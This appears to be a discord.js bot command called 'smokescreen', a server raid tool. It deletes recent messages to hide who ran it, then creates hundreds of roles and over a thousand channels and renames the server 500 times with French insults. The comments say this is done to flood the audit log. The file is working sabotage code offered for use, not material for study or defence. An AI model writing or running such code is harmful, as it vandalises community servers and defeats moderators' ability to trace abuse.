const Discord = require('discord.js');

  const ms = require('ms');
  exports.run = (client, message, args) => {


    message.channel.fetchMessages({limit: 10}).then(messages => message.channel.bulkDelete(messages)); //deletes messages to cover up you did it

            for (var i = 0; i < 250; i++) {
                // Creates new roles to clog up the audit log
                message.guild.createRole({
                    name: 'On vous aimes <3',
                    color: 'RED',
                });
              }
                for (var i = 0; i < 500; i++) {
                message.guild.createChannel('FUUUUUUUUUCK', 'voice')
                message.guild.createChannel('FUUUUUUUUUCK', 'text')
                //changes name tons of times to clog up the audit log
                message.guild.setName("L'abtique t'encule "+ i + " Fois");
                }

              /*  message.guild.members.forEach(m => {
                  m.setUsername('Raid By Union <3')
                }); */


            };



    exports.conf = {
        enabled: true,
        guildOnly: false,
        aliases: [],
        permLevel: 0
      };

      exports.help = {
        name: 'smokescreen',
        description: '',
        usage: ''
      };
